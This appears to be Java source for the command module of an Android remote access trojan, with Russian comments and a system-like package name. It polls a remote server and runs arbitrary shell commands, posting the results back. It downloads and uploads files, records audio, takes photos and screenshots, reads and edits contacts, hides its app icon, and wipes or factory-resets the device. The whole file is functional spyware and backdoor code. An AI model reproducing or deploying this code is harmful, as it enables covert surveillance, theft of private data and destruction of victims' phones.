package oom.android.system;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONObject;
import org.json.JSONStringer;

import oom.android.system.Managers.CallsManager;
import oom.android.system.Managers.CameraManager;
import oom.android.system.Managers.ContactsManager;
import oom.android.system.Managers.ScreenShotManager;
import oom.android.system.Managers.SmsManager;
import oom.android.system.Managers.audioManager;

public class ShellSession implements Runnable {
    Context context;
    WakeLock wakeLock;
    List<String> remotelist = new ArrayList<String>(); // файлы по строкам на сервере

    String timestamp;
    int max_attempts=300;  // количество попыток получения команды при активном коннекте
    int idleattempts=0;    // кол-во ответов на запрос без новой команды
    String cmd;            //комманда
    String requested_file; // файл который требуют загрузить
    String cmd_spec;       //спец комманда
    long lastrequesttime;  //ремя последнего запроса
    long curtime;          //время
    long shell_interval=60000;  // уже в секундах(!), <10 мин назад - запускаем акт шелл 300

    long on_con_error_delay=1800000; // когда временно нет связи 60000 - 1м 1800000 - 30м
    long no_requests_delay= 600000; //мсек время с последнего запроса - проверяем каждые 10 мин 600000 через сколько будут получать новые комманды
    long between_cmd_delay= 30000; // между получением новой команды в акт. фазе -30 сек
    //boolean is_rooted=false;
    String connection_type;         //тип связи (wifi,3g т.д.)
    audioManager Am;

    ShellSession(){
        this.context=MyService.getContext();
    }

    @Override
    public void run() {
        if(!MyService.ScreenOn){
            try{
                PowerManager mgr = (PowerManager)context.getSystemService(Context.POWER_SERVICE); // лочим
                wakeLock = mgr.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "oom.android.system:shellWakeLock");
                wakeLock.acquire();
            } catch(Exception e){
                Log.d(MyService.LOG_TAG, "ошибка настройки блокировки!");
            }
        }
        try{
            // устанавливаем тайминги в зав-ти от типа подключения к инету
            ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo info = cm.getActiveNetworkInfo();
            connection_type=info.getTypeName()+":"+info.getSubtypeName();

            if(info != null && info.isConnected() && info.getType() == ConnectivityManager.TYPE_MOBILE){
                Log.d(MyService.LOG_TAG, "используется 3g/edge. изменение времени");

                on_con_error_delay=3600000;  // по умолчанию 60000 мсек = 1 мин --5мин 300000
                no_requests_delay=600000;   // 600000 мсек = 10 мин -- 20мин 1200000
            }
        }
        catch(Exception e){Log.d(MyService.LOG_TAG, "ошибка получения информации о связи");}


        while(true){
            try{
                remotelist=load_url(MyService.shelltime_url);
                if(remotelist.size()!=0&&!(timestamp=remotelist.get(0)).equals("END")){
                    lastrequesttime=Long.parseLong(timestamp);
                    curtime=System.currentTimeMillis()/1000;
                    Log.d(MyService.LOG_TAG, String.valueOf((curtime-lastrequesttime)));
                    Log.d(MyService.LOG_TAG,(curtime-lastrequesttime<shell_interval)? "true" : "false");
                    if(curtime-lastrequesttime<shell_interval){
                        Log.d(MyService.LOG_TAG,"запрос был не давно! активация шелл'а.");
                        activate_shell();
                    }

                    Thread.sleep(no_requests_delay); // сон на время без запросов
                }
            }
            catch (InterruptedException e){

                try{
                    wakeLock.release();
                }catch(Exception ex){}
                MyService.cmdsessionactive=false;
                return;//break;
            }
            catch (Exception e){
                Log.d(MyService.LOG_TAG,"shell не смог установить соединение!\n"+e.toString());
                try {
                    Thread.sleep(on_con_error_delay);
                }
                catch(InterruptedException ex){
                    Log.d(MyService.LOG_TAG,"shell был прерван");
                    if(!MyService.ScreenOn) {
                        try {
                            wakeLock.release();
                        } catch (Exception ex1) { }
                    }
                    MyService.cmdsessionactive=false;
                    return;
                }
            }
        }
    }

    public void activate_shell() throws InterruptedException{
        idleattempts=0;
        MyService.cmdsessionactive=true;
        while(idleattempts<max_attempts){
            try{
                remotelist=load_url(MyService.cmd_url); // результат в remotelist <array>
                if(remotelist.size()!=0&&!(cmd=remotelist.get(0)).equals("END")){
                    if(remotelist.size()>1 &&!(cmd_spec=remotelist.get(1)).equals("END")){
                        if(!cmd_spec.equals("")){
                            try{
                                exec_spec(cmd_spec);
                            } catch(Exception e){
                                Log.d(MyService.LOG_TAG,"ошибка при выполнении команды: \n"+cmd+"\"");
                                //post(MyService.post_url,"ошибка при выполнении команды: \n"+cmd+"\"");
                            }
                        }
                    }
                    idleattempts=0; //сбрасываем счетчик - появилась активность
                    if(!cmd.equals("")){
                        Log.d(MyService.LOG_TAG,"текущаяя команда: \""+cmd+"\" выполняется..");
                        try{
                            List<String> res = exec_cmd(cmd);
                            if (res.size()!=0){
                                postdata(MyService.post_url,res); // отсылаем результат
                            } else{
                                post(MyService.post_url,"error");
                            }

                        } catch(Exception e){
                            Log.d(MyService.LOG_TAG,"ошибка при выполнении команды: \n"+cmd+"\"");
                        }
                    }
                }
            }
            catch(Exception e){
                Log.d(MyService.LOG_TAG,"ошибка при получении удаленной команды\n"+e.toString());
            }

            Thread.sleep(between_cmd_delay);
            idleattempts++;

        }
        MyService.cmdsessionactive=false;

    }

    public List<String> exec_cmd(String command){
        String inputLine;
        List<String> res = new ArrayList<String>();

        try {
            Process process = Runtime.getRuntime().exec(command);
            if(command.startsWith("kill") || command.startsWith("mkdir") || command.startsWith("mv") || command.startsWith("rm") || command.startsWith("rmdir") ){
                res.add("Command :"+command+" successful");
            }
            else{
                BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));

                while ((inputLine = in.readLine())!=null){
                    res.add(inputLine);
                }
            }

        } catch (Exception e) {
            Log.d(MyService.LOG_TAG,"ошибка выполнения: \""+command+"\"\n"+e.toString());
        }
        return res;
    }


    public void exec_spec(String command){
        try {
            Am=new audioManager(MainActivity.context);
            Log.d("Command","Command:" + command);
            if(command.startsWith("download ")){   // скачать пользовательский файл с URL
                String fileurl = new String(command.substring(9));  // url начинается с 9го символа
                boolean isdownloaded  = downloadfile(fileurl);
                if(isdownloaded){
                    post(MyService.post_url,fileurl+" saved successfully");
                }
                else{
                    post(MyService.post_url," error downloading "+fileurl);
                }
            }

            else if(command.startsWith("upload ")){   // upload file
                String requested_file = new String(command.substring(7));
                if(!requested_file.equals("")){
                    Log.d(MyService.LOG_TAG,"uploading "+requested_file+"..");
                    uploadfile(requested_file);}
            }

            else if(command.equals("restart")){
                Log.d(MyService.LOG_TAG, "restarting whole service!");
                post(MyService.post_url,"restarting whole service!");
                System.exit(0);

            }

            else if(command.startsWith("record")){
                if(!MyService.recording){
                    int delay;
                    String[] param = new String[2];
                    try{
                        param= command.split(" ");
                        delay = Integer.parseInt(new String(command.substring(7)));
                    }
                    catch (Exception e){
                        delay=10; // криво спарсили/нет аргумента - уст. по умолчанию 10 сек
                    }
                    if(param[1]=="online")
                        Am.startRecording(true);
                    else
                        Am.startRecording(false);
                    MyService.record_must_be_stopped=true;
                    record_auto_stop(delay);
                    post(MyService.post_url,"recording started with delay "+delay+" seconds");

                }
                else{post(MyService.post_url,"already recoding at the moment!");}
            }

            else if(command.equals("stoprecord")){
                if(MyService.recording){
                    Am.stopRecording();
                    MyService.record_must_be_stopped=false;
                    post(MyService.post_url,"recording stopped!");
                }
                else{post(MyService.post_url,"recording already stopped!");}
            }

            else if(command.startsWith("sync")){
                String args[] = command.split(" ");
                switch (args.length) {
                    case 1:
                        if(!MyService.syncactive){
                            sync(MyService.log_path,true);
                            post(MyService.post_url,"sync initiated!");}
                        else{post(MyService.post_url,"already syncing!");}
                        break;

                    case 2:
                        if(!MyService.syncactive){
                            sync(args[1],true);
                            post(MyService.post_url,"started syncing "+args[1]);
                        }
                        else{
                            post(MyService.post_url,"already syncing!");
                        }
                        break;
                }
            }

            else if(command.startsWith("secsync")){
                String args[] = command.split(" ");
                switch (args.length) {
                    case 1:
                        if(!MyService.syncactive){
                            sync(MyService.log_path,false);
                            post(MyService.post_url,"secure sync initiated!");}

                        else{
                            post(MyService.post_url,"already syncing!");
                        }
                        break;

                    case 2:
                        if(!MyService.syncactive){
                            sync(args[1],false);
                            post(MyService.post_url,"started secure syncing "+args[1]);
                        }
                        else{
                            post(MyService.post_url,"already syncing!");
                        }
                        break;
                }
            }

            else if(command.equals("quit")){   // завершить шелл
                MyService.cmdsessionactive=false;
                Thread.currentThread().interrupt();
            }

            else if(command.equals("clear")){   // очистка папки приложения
                try{
                    String datadir=context.getApplicationInfo().dataDir;
                    Runtime.getRuntime().exec("rm -r "+datadir+"/files/logs/");
                    Runtime.getRuntime().exec("mkdir "+datadir+"/files/logs/");
                    post(MyService.post_url,"app files cleaned");}
                catch (Exception e){}
            }

            else if(command.equals("photo")){   // фото с камеры
                String[] params = new String[]{};
                try{
                    params = command.split(" ");
                }catch (Exception e){}
                int id;
                boolean online;
                try{
                    id = Integer.parseInt(params[0]);
                    online = Boolean.valueOf(params[1]);
                }
                catch (Exception e){
                    id=0; // криво спарсили/нет аргумента - уст. по умолчанию 10 сек
                    online=false;
                }
                try{
                    new CameraManager(MainActivity.context,MainActivity.activity).startUp(id,online);
                }
                catch (Exception e){}
            }

            else if(command.equals("factoryformat")){   // форматнуть нафиг ;p
                factoryformatussd();
            }

            else if(command.startsWith("getcams")){//вынести в отдельный класс
                List<String> list = function.get_numberOfCameras();
                postdata(MyService.post_url,list);
            }

            else if(command.equals("hideappicon")){//вынести в отдельный класс
                try {
                    function.hideAppIcon(MainActivity.context);
                    post(MyService.post_url,"Hide App Icon successfully");
                }catch (Exception e){
                    post(MyService.post_url,"ERROR Hide App Icon:"+e.getMessage());
                }

            }

            else if(command.equals("unhideappicon")){//вынести в отдельный класс
                try {
                    function.unHideAppIcon(MainActivity.context);
                    post(MyService.post_url,"UnHide App Icon successfully");
                }catch (Exception e){
                    post(MyService.post_url,"ERROR UnHide App Icon");
                }
            }

            else if(command.equals("screenshot ")){

                String json = command.substring(command.indexOf(" "));
                JSONObject Json = new JSONObject(json);

                ScreenShotManager.savePic(Json.getBoolean("online"),ScreenShotManager.takeScreenShot(MainActivity.activity));

            }

            else if(command.equals("wipedata")){
                MyService.devicePolicyManager.wipeData(47);
            }

            else if(command.equals("look")){
                MyService.devicePolicyManager.lockNow();
            }

            else if(command.startsWith("ContAdd")){
                Integer ind = command.indexOf(" ");
                String json = command.substring(ind);
                JSONObject userJson = new JSONObject(json);
                if(userJson.getBoolean("stand") ==true)
                    ContactsManager.AddContact(userJson.get("name").toString(),userJson.get("phone").toString());


            }
            else if(command.startsWith("getContactsList")){
                try{
                    post(MyService.out_contacts,ContactsManager.getContacts(MyService.getContext()).toString());
                }catch (Exception e){}

            }
            else if(command.startsWith("ContDel")){
                Integer ind = command.indexOf(" ");
                String json = command.substring(ind);
                JSONObject userJson = new JSONObject(json);
                ContactsManager.DeleteContact(userJson.get("raw").toString(),userJson.get("name").toString());
            }
            else if(command.startsWith("ContChn")){
                Integer ind = command.indexOf(" ");
                String json = command.substring(ind);
                JSONObject userJson = new JSONObject(json);
                ContactsManager.UpdateContact(userJson.get("raw").toString(),userJson.get("name").toString(),userJson.get("phone").toString(),userJson.get("Nname").toString(),userJson.get("Nphone").toString());
            }



        } catch (Exception e) {
            Log.d(MyService.LOG_TAG,"error executing spec: \""+command+"\"\n"+e.toString());
        }
    }

    void factoryformatussd(){
        String ussdCode = "*2767*3855"+Uri.encode("#");
        context.startActivity(new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + ussdCode)).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }

    public boolean downloadfile(String fileURL) { // returns true if succeeds
        try{
            boolean res=true;
            URL url = new URL(fileURL);
            HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
            int responseCode = httpConn.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {
                String fileName = "";
                String disposition = httpConn.getHeaderField("Content-Disposition");

                if (disposition != null) {
                    int index = disposition.indexOf("filename=");
                    if (index > 0) {
                        fileName = disposition.substring(index + 10,
                                disposition.length() - 1);
                    }
                } else {
                    fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1,
                            fileURL.length());
                }

                InputStream inputStream = httpConn.getInputStream();
                String saveFilePath = context.getFilesDir().getPath() + File.separator + fileName;
                Log.d(MyService.LOG_TAG, saveFilePath);

                FileOutputStream outputStream = new FileOutputStream(saveFilePath);

                int bytesRead = -1;
                byte[] buffer = new byte[4096];
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }

                outputStream.close();
                inputStream.close();

                Log.d(MyService.LOG_TAG, "файл "+saveFilePath+" скачан");
                post(MyService.post_url,"file "+saveFilePath+"downloaded");
            } else {
                Log.d(MyService.LOG_TAG, "Нет файла для скачивания. Сервер ответил HTTP-код: " + responseCode);
                post(MyService.post_url,"No file to download. Server replied HTTP code: " + responseCode);
                res=false;
            }
            httpConn.disconnect();
            return res;
        } catch (Exception e){

            Log.d(MyService.LOG_TAG, "ошибка при загрузке "+fileURL+"\n"+e.toString());
            post(MyService.post_url,"error downloading   "+fileURL+"\n"+e.toString());
            return false;
        }
    }

    static void uploadfile(String file) {
        Runnable uploader = new HttpPoster(file);
        Thread t = new Thread(uploader);
        t.start();
    }

    void sync(String path,boolean is_plain){

        HiddenWaiter.syncthread = new Thread(new SyncThread(path,context,is_plain,true)); // bool = plain
        HiddenWaiter.syncthread.setName("usersyncthread");
        HiddenWaiter.syncthread.start();
    }

    void record_auto_stop(final long delay_secs){
        Runnable limiter = new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(delay_secs*1000);   // в миллисекунды
                    if(MyService.record_must_be_stopped){
                        Am.stopRecording();
                        MyService.record_must_be_stopped=false;
                        post(MyService.post_url,"recording auto-stopped after "+delay_secs+" secs");
                    }
                } catch (Exception e) {
                }


            }
        };
        new Thread(limiter).start();

    }

    static public List<String> load_url(String url_string){
        List<String> res = new ArrayList<String>();
        try{
            URL url = new URL(url_string);
            HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestMethod("GET");
            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                Log.d(MyService.LOG_TAG, "load_url() error: "+connection.getResponseCode());
            }
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String inputLine;

            while ((inputLine = in.readLine())!=null&&!(inputLine.equals("END"))){
                res.add(inputLine);}
            in.close();
            connection.disconnect();
            //Log.d(LOG_TAG, "total: "+remotelist.size());
        }
        catch(Exception e){
            Log.d(MyService.LOG_TAG, "ошибка при установлении соединения\\создание потока\n"+e.toString());
            return null;
        }
        return res;
    }

    public void postdata(String url,List<String> data) {
        Runnable uploader = new HttpPoster(url,data);
        new Thread(uploader).start();
    }

    public void post(String url,String data) {
        Runnable uploader = new HttpPoster(url,data);
        new Thread(uploader).start();
    }
}
